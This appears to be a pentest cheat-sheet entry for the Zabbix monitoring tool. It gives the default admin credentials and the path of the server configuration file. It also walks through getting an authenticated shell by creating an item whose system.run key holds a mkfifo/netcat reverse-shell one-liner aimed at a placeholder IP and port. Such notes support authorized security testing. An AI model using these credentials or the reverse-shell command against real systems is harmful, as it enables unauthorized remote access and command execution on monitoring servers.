# zabbix

Zabbix is an open-source monitoring software tool for diverse IT components, including networks, servers, virtual
machines and cloud services. Zabbix provides monitoring metrics, among others network utilization, CPU load and disk
space consumption.

## Default Credentials

```bash
Admin:zabbix
```

## Interesting Paths

```bash
# config file
/etc/zabbix/zabbix_server.conf
```

## Shell (authenticated)

1. Configuration > Hosts > Items > Create New
2. set key: `system.run[rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc IP PORT >/tmp/f &,nowait]`
3. Click Test > Get Value & Test

## References

* [blog.zabbix.com/zabbix-remote-commands/](https://blog.zabbix.com/zabbix-remote-commands/7500/)